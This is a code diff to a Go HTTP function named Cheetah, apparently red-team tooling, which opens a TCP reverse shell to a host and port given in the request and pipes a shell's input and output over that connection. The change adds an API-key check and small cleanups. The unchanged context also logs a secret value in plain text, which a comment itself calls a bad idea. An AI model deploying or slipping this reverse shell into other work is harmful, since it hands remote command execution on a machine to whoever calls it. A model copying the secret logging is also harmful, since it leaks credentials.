@@ -36,10 +36,23 @@ func respondWithError(w http.ResponseWriter, errMsg string, statusCode int) {
 	fmt.Fprintf(w, "%s", responseJSON)
 }
 
+func isApiTokenValid(key string) bool {
+	apiKey := os.Getenv("CHEETAH_API_KEY")
+	return apiKey == key
+}
+
 // Cheetah establishes a TCP reverse shell connection.
 func Cheetah(w http.ResponseWriter, r *http.Request) {
 	// Audit logging
 	writeLog(1, "Startup: The Cheetah is running.")
+
+	// Validate API Key
+	apiKey := r.Header.Get("x-api-key")
+	if !isApiTokenValid(apiKey) {
+		writeLog(2, "Invalid API key.")
+		respondWithError(w, "Forbidden", 403)
+		return
+	}
 
 	// Grab the function timeout
 	timeout, err := strconv.ParseUint(os.Getenv("CHEETAH_FUNCTION_TIMEOUT"), 10, 64)
@@ -56,10 +69,6 @@ func Cheetah(w http.ResponseWriter, r *http.Request) {
 	// NOTE: DON'T DO THIS IN REAL LIFE. BAD IDEA TO LOG SECRETS
 	// DEBUG ONLY: Make sure it found the value
 	writeLog(8, fmt.Sprintf("Secret value: %s", secret))
-
-	type Response struct {
-		Error string
-	}
 
 	host := r.URL.Query().Get("host")
 	port := r.URL.Query().Get("port")
@@ -100,7 +109,7 @@ func Cheetah(w http.ResponseWriter, r *http.Request) {
 	cmd.Stdin, cmd.Stdout, cmd.Stderr = conn, conn, conn
 	cmd.Run()
 
-	if timedOut == true {
+	if timedOut {
 		respondWithError(w, "Timeout: Function timeout occurred.", 500)
 	} else {
 		respondWithError(w, "Connection terminated from client.", 500)
